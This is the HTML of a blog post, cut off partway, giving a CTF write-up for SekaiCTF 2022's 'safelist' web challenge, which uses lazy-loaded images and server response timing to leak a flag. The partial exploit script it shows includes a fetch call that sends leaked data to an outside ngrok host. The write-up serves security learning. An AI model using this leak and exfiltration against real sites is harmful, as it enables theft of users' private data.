@@ -1,0 +1,770 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="en">
+<head>
+    <meta charset="utf-8">
+<title>SekaiCTF 2022 Notes and Concurrent Limit - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+            
+<link href="https://blog.huli.tw/2022/10/08/sekaictf2022-safelist-and-connection/" rel="alternate" hreflang="zh-TW" />
+            
+    
+
+
+
+
+    
+<link rel="canonical" href="https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/">
+    
+
+
+
+
+
+    <meta name="description" content="I casually played SekaiCTF 2022 last weekend and I have to say that the visual style is pretty cool. You can tell that a lot of effort was put into it, and it feels like a game. This time, I only play">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SekaiCTF 2022 Notes and Concurrent Limit">
+<meta property="og:url" content="https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="I casually played SekaiCTF 2022 last weekend and I have to say that the visual style is pretty cool. You can tell that a lot of effort was put into it, and it feels like a game. This time, I only play">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.huli.tw/img/sekaictf2022-safelist-and-connection/cover-en.png">
+<meta property="article:published_time" content="2022-10-08T01:43:37.000Z">
+<meta property="article:modified_time" content="2023-06-20T05:10:49.076Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/sekaictf2022-safelist-and-connection/cover-en.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="SekaiCTF 2022 Notes and Concurrent Limit" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=3.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/en">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/en/archives">Archive</a>
+            
+            <a class="navbar-item "
+               href="/en/categories">Categories</a>
+            
+            <a class="navbar-item "
+               href="/en/about">About</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="Table of Contents">
+                    Table of Contents
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#loading-image">1&nbsp;&nbsp;<b>Loading image</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#the-server-is-busy">2&nbsp;&nbsp;<b>The server is busy</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#post-match-review">3&nbsp;&nbsp;<b>Post-match Review</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#obligatory-calc">4&nbsp;&nbsp;<b>Obligatory Calc</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Twitter" href="https://twitter.com/aszx87410">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+               <a class="navbar-item" href="/2022/10/08/sekaictf2022-safelist-and-connection/">中文</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        If you have any thoughts on my blog or articles and you want to let me know, you can either post a comment below(public) or tell me via this <a href="https://forms.gle/SjJZ4cnNs6NnjXQG8" target="_blank">feedback form</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            SekaiCTF 2022 Notes and Concurrent Limit
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2022-10-08T01:43:37.000Z" itemprop="datePublished">8 October 2022</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/en/categories/Security/">Security</a>
+        </span>
+        
+        
+        
+        <spen data-nosnippet class="column is-narrow">(Translated by ChatGPT)</span>
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <p>I casually played SekaiCTF 2022 last weekend and I have to say that the visual style is pretty cool. You can tell that a lot of effort was put into it, and it feels like a game.</p>
+<p>This time, I only played two web challenges. I got first blood on the safelist of xsleak, but I couldn’t solve the other one. It’s a bit of a shame (when justCatTheFish solved it, I was wondering who was so powerful, but after the competition, I found out that it was terjanq lol).</p>
+<p>In this post, I will write about the solution for safelist and Obligatory Calc. If you want to see other web challenges, you can check out lebr0nli’s blog: <a target="_blank" rel="noopener" href="https://lebr0nli.github.io/blog/security/SekaiCTF-2022/">SekaiCTF 2022 Writeups</a></p>
+<p>Keywords:</p>
+<ol>
+<li>xsleak</li>
+<li>lazy loading image</li>
+<li>6 concurrent request limit</li>
+<li>socket pool</li>
+<li>null origin</li>
+<li>null e.source</li>
+</ol>
+<span id="more"></span>
+
+<p>Challenge Description:</p>
+<blockquote>
+<p>Safelist™ is a completely safe list site to hold all your important notes! I mean, look at all the security features we have, we must be safe!</p>
+</blockquote>
+<p><img src="/img/sekaictf2022-safelist-and-connection/p1.png" alt="challenge"></p>
+<p>Source code: <a target="_blank" rel="noopener" href="https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/safelist">https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/safelist</a></p>
+<p>This challenge is quite simple. You can add and delete notes, and because it is a client-side challenge, there is an admin bot that can provide a URL for it to visit.</p>
+<p>The special thing about this challenge is that it sets a lot of headers, some of which I have never seen before:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>nonce <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token comment">// Surely this will be enough to protect my website</span>
+    <span class="token comment">// Clueless</span>
+    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy"</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+        default-src 'self';
+        script-src 'nonce-</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>res<span class="token punctuation">.</span>locals<span class="token punctuation">.</span>nonce<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">' 'unsafe-inline';
+        object-src 'none';
+        base-uri 'none';
+        frame-ancestors 'none';
+    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\s+</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Cache-Control"</span><span class="token punctuation">,</span> <span class="token string">"no-store"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"X-Frame-Options"</span><span class="token punctuation">,</span> <span class="token string">"DENY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"X-Content-Type-Options"</span><span class="token punctuation">,</span> <span class="token string">"nosniff"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Referrer-Policy"</span><span class="token punctuation">,</span> <span class="token string">"no-referrer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Cross-Origin-Embedder-Policy"</span><span class="token punctuation">,</span> <span class="token string">"require-corp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Cross-Origin-Opener-Policy"</span><span class="token punctuation">,</span> <span class="token string">"same-origin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Cross-Origin-Resource-Policy"</span><span class="token punctuation">,</span> <span class="token string">"same-origin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">"Document-Policy"</span><span class="token punctuation">,</span> <span class="token string">"force-load-at-top"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>id <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomUUID</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>users<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        users<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>id<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>
+            <span class="token literal-property property">list</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    req<span class="token punctuation">.</span>user <span class="token operator">=</span> users<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>I have written about the CO series before, but I really tried it this time and found that some of them are a bit different from what I understood. For example, I thought that <code>Cross-Origin-Opener-Policy</code> meant “when a page with this setting is opened with window.open, the opened window will not have an opener”, but later I found out that it should be bidirectional, that is, “when I open a page with this setting from another page, I cannot access it”.</p>
+<p><code>Document-Policy</code> is also cool. <code>force-load-at-top</code> should be used to prohibit Scroll-to-text-fragment and #abc anchor.</p>
+<p>In addition, the content of the note will also be filtered by <code>DOMPurify.sanitize()</code>. When encountering such challenges, there are basically a few directions:</p>
+<ol>
+<li>Meta can be used</li>
+<li>Style can be used</li>
+<li>Window DOM clobbering can be used (not for document)</li>
+<li>Img can be used to send requests</li>
+</ol>
+<p>When I first looked at the code, I quickly found a suspicious place:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">"/create"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">let</span> <span class="token punctuation">&#123;</span> text <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
+
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>text <span class="token operator">||</span> <span class="token keyword">typeof</span> text <span class="token operator">!==</span> <span class="token string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"Missing 'text' variable"</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+
+    req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>text<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2048</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>list<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>When you add a note, the entire note will be re-sorted.</p>
+<p>The flag format for this challenge has special instructions, which is <code>^SEKAI&#123;[a-z]+&#125;$</code>, and the flag format is relatively simple.</p>
+<p>We can use this sorting function to add a note “before the flag” or “after the flag” to do xsleak.</p>
+<p>My initial idea was to construct a payload like this: <code>[CHAR]&lt;canvas height=&quot;1200px&quot;&gt;&lt;/canvas&gt;&lt;div id=&quot;scroll&quot;&gt;&lt;/div&gt;</code></p>
+<p>The key is to achieve:</p>
+<ol>
+<li>If [CHAR] is in front of the flag, nothing will happen when you update the location to #scroll (because #scroll can be seen without scrolling)</li>
+<li>If [CHAR] is behind the flag, the page will scroll to the specified location when you update the location to #scroll (because scrolling is required)</li>
+</ol>
+<p>If you can detect this scrolling behavior and find the matching height, you can know whether [CHAR] is in front of or behind the flag, and then you can know the nth character of the flag.</p>
+<p>For example, if <code>SEKAI&#123;x</code> does not scroll, and <code>SEKAI&#123;y</code> does scroll, then we know that the first letter of the flag must be x.</p>
+<p>The problem is that I couldn’t find a way to detect scrolling. There is a method on the xsleak wiki that requires an iframe, but it doesn’t work for this problem. Also, just updating the location won’t work because of the <code>Cross-Origin-Opener-Policy</code> mentioned earlier, which gives you no control over the opened window, not even the ability to close it:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> w <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'https://safelist.ctf.sekai.team/'</span><span class="token punctuation">)</span>
+<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    w<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">'https://safelist.ctf.sekai.team/#scroll'</span> <span class="token comment">// not working</span>
+    <span class="token comment">// even w.close() not working</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>No problem, I came up with another method later.</p>
+<h2><span id="loading-image">Loading image</span></h2><p>In xsleak problems, lazy loading images are quite common, and the method I thought of is actually similar to the previous one, except that we replace the #scroll element with an image.</p>
+<p>The goal is still to find the correct value, which we call the threshold. We can achieve behavior like the following: if the note is before the flag, the image will load:</p>
+<p><img src="/img/sekaictf2022-safelist-and-connection/p2.png" alt="note1"></p>
+<p>If the note is below the flag, the image will not load due to lazy loading:</p>
+<p><img src="/img/sekaictf2022-safelist-and-connection/p3.png" alt="note2"></p>
+<p>The content of the note looks like this: <code>A&lt;br&gt;&lt;canvas height=&quot;1850px&quot;&gt;&lt;/canvas&gt;&lt;br&gt;&lt;img loading=lazy src=/?img&gt;</code></p>
+<p>Here, 1850px is the value I tested on my own browser. As for the remote admin bot, you can first run a headless browser locally and then slowly adjust and test it. The value I finally found was 3350px.</p>
+<p>Next, as long as we can find a way to detect whether the image has loaded, we can infer the order of the flag and leak out the entire flag one character at a time.</p>
+<p>The usual way is to use cache, but this problem has a special setting of <code>Cache-Control: no-store</code>, so we cannot use cache.</p>
+<p>What about the concurrent limit? In the case of HTTP 1.1, the browser can only open a maximum of 6 connections to a host at the same time, so if we load a lot of images and then time the requests on another page, the speed should be much slower because the connection is blocked.</p>
+<p>But I tried this trick and found that it didn’t work. Although I did load a lot of images, on the other side, I used fetch to test and the connection was not blocked.</p>
+<p>So I thought at the time that this limit should be for “each page”, meaning that when I send a request to target.com from a.com, I can only open 6 at the same time, but I can open 6 at the same time on b.com, and each page is separated.</p>
+<p>But even if the connection is not blocked by the browser, it doesn’t matter because the server is still affected.</p>
+<h2><span id="the-server-is-busy">The server is busy</span></h2><p>The server for this problem runs on Node.js, which is single-threaded, meaning it can only handle one request at a time, and other requests will be queued.</p>
+<p>Therefore, in development, we avoid some “synchronous and time-consuming” work because it causes performance issues, such as:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/heavy'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token function">heavyMathCalculation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+
+app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/hello'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>When I send a request to &#x2F;heavy and then another to &#x2F;hello, &#x2F;hello won’t receive a response until <code>heavyMathCalculation</code> is finished.</p>
+<p>Although there is no such time-consuming work in this problem, if we send a lot of requests, the server still needs time to process them, so there will still be differences in response time.</p>
+<p>To summarize, the idea is roughly as follows:</p>
+<ol>
+<li>Create a note with CHAR at the beginning</li>
+<li>Continuously use fetch to detect response time</li>
+<li>If the response time is less than the threshold, it means that CHAR is behind the flag, so the image is not loaded</li>
+<li>Conversely, if the response time is greater than the threshold, it means that CHAR is in front of the flag because the image loading slows down the server</li>
+<li>The goal is to find a CHAR that satisfies the following conditions: <code>time(CHAR)&gt;threshold &amp;&amp; time(CHAR+1)&lt;threshold</code></li>
+</ol>
+<p>Below are two screenshots. The first one is for <code>SEKAI&#123;z&#125;</code>, and the total loading time for fetch is 0.9 seconds (30 requests), which is relatively fast, indicating that the image was not loaded:</p>
+<p><img src="/img/sekaictf2022-safelist-and-connection/p4.png" alt="req1"></p>
+<p>This one is for <code>SEKAI&#123;m&#125;</code>, and the loading time is 1.7s, which is obviously much longer than z, so the first character must be in the range of m~y.</p>
+<p><img src="/img/sekaictf2022-safelist-and-connection/p5.png" alt="req2"></p>
+<p>As long as you do a modified binary search, you can quickly find which character it is. My final script is as follows (you can get one character per run):</p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/aszx87410/155f8110e667bae3d10a36862870ba45">https://gist.github.com/aszx87410/155f8110e667bae3d10a36862870ba45</a></p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token comment">&lt;!--
+  The basic idea is to create a post with a lot of images which send request to "/" to block server-side nodejs main thread.
+  If images are loading, the request to "/" is slower, otherwise faster.
+  By using a well-crafted height, we can let note with "A" load image but note with "Z" not load.
+  We can use fetch to measure the request time.
+--></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>start<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:1234/create<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>inp</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f2</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:1234/remove<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>inp2</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">let</span> flag <span class="token operator">=</span> <span class="token string">'SEKAI&#123;'</span>
+    <span class="token keyword">const</span> <span class="token constant">TARGET</span> <span class="token operator">=</span> <span class="token string">'https://safelist.ctf.sekai.team'</span>
+    f<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token constant">TARGET</span> <span class="token operator">+</span> <span class="token string">'/create'</span>
+    f2<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token constant">TARGET</span> <span class="token operator">+</span> <span class="token string">'/remove'</span>
+
+    <span class="token keyword">const</span> <span class="token function-variable function">sleep</span> <span class="token operator">=</span> <span class="token parameter">ms</span> <span class="token operator">=></span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">r</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> ms<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">const</span> <span class="token function-variable function">send</span> <span class="token operator">=</span> <span class="token parameter">data</span> <span class="token operator">=></span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://server.ngrok.io?d='</span><span class="token operator">+</span>data<span class="token punctuation">)</span>
